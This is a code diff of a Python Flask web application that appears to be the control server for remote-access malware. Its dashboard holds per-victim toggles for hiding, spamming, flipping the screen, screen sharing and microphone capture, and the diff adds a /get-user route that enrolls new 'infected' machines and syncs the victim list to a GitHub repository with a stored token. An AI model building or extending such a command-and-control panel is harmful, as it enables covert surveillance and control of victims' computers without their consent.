@@ -6,7 +6,6 @@ import base64
 import json
 import requests as rq
 import io
-import queue
 from zoneinfo import ZoneInfo
 
 app = Flask(__name__)
@@ -36,47 +35,54 @@ state_file = os.path.join(STATIC_FOLDER, "state.json")
 UPLOAD_FOLDER = os.path.join(STATIC_FOLDER, "sounds")
 if not os.path.exists(UPLOAD_FOLDER):
     os.makedirs(UPLOAD_FOLDER)
-with open(os.path.join(STATIC_FOLDER,"users.json")) as file:
-	data = json.load(file)
-users = data["users"]
-user_status = {}
-for user in users:
-    user_status[user]= time()
 
-with open(state_file,"w") as file:
-    states = {}
+user_status = None
+
+
+def userInfo():
+    global user_status    
+    with open(os.path.join(STATIC_FOLDER,"users.json")) as file:
+        data = json.load(file)
+    users = data["users"]
+    user_status = {}
     for user in users:
-        states[str(user)] = {
-            "hideToggleState": {
-                "state": "off",
-                "color": "red"
-            },
-            "spamToggleState": {
-                "state": "off",
-                "color": "red"
-            },
-            "flipToggleState": {
-                "state": "off",
-                "color": "red"
-            },
-            "shareToggleState": {
-            	"state": "off",
-            	"color": "red"
-            },
-            "INToggleState": {
-            	"state": "off",
-            	"color": "red"
-            },
-            "micToggleState": {
-            	"state": "off",
-            	"color": "red"
-            },
-            "comsToggleState": {
-                "state":"off",
-            	"color": "red"
-            }                       
-        }
-    json.dump(states, file, indent=4)			
+        user_status[user]= time()
+
+    with open(state_file,"w") as file:
+        states = {}
+        for user in users:
+            states[str(user)] = {
+                "hideToggleState": {
+                    "state": "off",
+                    "color": "red"
+                },
+                "spamToggleState": {
+                    "state": "off",
+                    "color": "red"
+                },
+                "flipToggleState": {
+                    "state": "off",
+                    "color": "red"
+                },
+                "shareToggleState": {
+                    "state": "off",
+                    "color": "red"
+                },
+                "INToggleState": {
+                    "state": "off",
+                    "color": "red"
+                },
+                "micToggleState": {
+                    "state": "off",
+                    "color": "red"
+                },
+                "comsToggleState": {
+                    "state":"off",
+                    "color": "red"
+                }                       
+            }
+        json.dump(states, file, indent=4)			
+userInfo()
 @app.route("/")
 def root():
     global firstReload
@@ -93,6 +99,7 @@ def root():
         target = json.load(file)
     users = target["users"]
     selected = target["selected"]
+    
     with open(state_file, "r") as file:
         data1 = json.load(file)
     hs = data1[selected_user]["hideToggleState"]["state"]
@@ -122,7 +129,7 @@ def root():
     else:
         data = {"tasks": []}
     firstReload = False       
-    return render_template("index.html", state=state if state else "Offline", files=files,images=images,videos=videos, exes=apps,tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,shc=shc,shs=shs,ic=ic,is1=is1,mc=mc,ms=ms,cc=cc,cs=cs,users=users,selected = selected_user)
+    return render_template("index.html", state=state if state else "Offline",files=files,images=images,videos=videos, exes=apps,tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,shc=shc,shs=shs,ic=ic,is1=is1,mc=mc,ms=ms,cc=cc,cs=cs,users=users,selected = selected_user)
 
 @app.route("/edit", methods=["POST", "GET"])
 def edit():
@@ -829,5 +836,32 @@ def screenshare():
 @app.route("/audiomic",methods=["GET"])
 def audiomic():
      return render_template("audio.html")
+
+@app.route("/get-user",methods=["GET"])
+def get_user():
+    with open(os.path.join(STATIC_FOLDER, "users.json"), "r") as file:
+        target = json.load(file)
+    inf_users = target["infected"]
+    user = f"inf{len(inf_users)+1}"
+    target["infected"].append(user)
+    target["users"].append(user)
+    with open(os.path.join(STATIC_FOLDER, "users.json"), "w") as file:
+        json.dump(target, file, indent=4)
+    url = f"https://api.github.com/repos/{owner}/{repo}/contents/{STATIC_FOLDER}/users.json"
+    headers = {
+            "Authorization": f"token {token}",
+            "Accept": "application/vnd.github.v3+json"
+        }				
+    data = {
+            "message": "inf user added",
+            "content": base64.b64encode(json.dumps(target).encode()).decode(),
+            "branch": branch
+        }				
+    response = rq.put(url, json=data, headers=headers)		
+    userInfo()		
+    if response.status_code == 201:
+        print("user successfully added")
+
+    return user    
 if __name__ == "__main__":
     app.run(host="0.0.0.0")
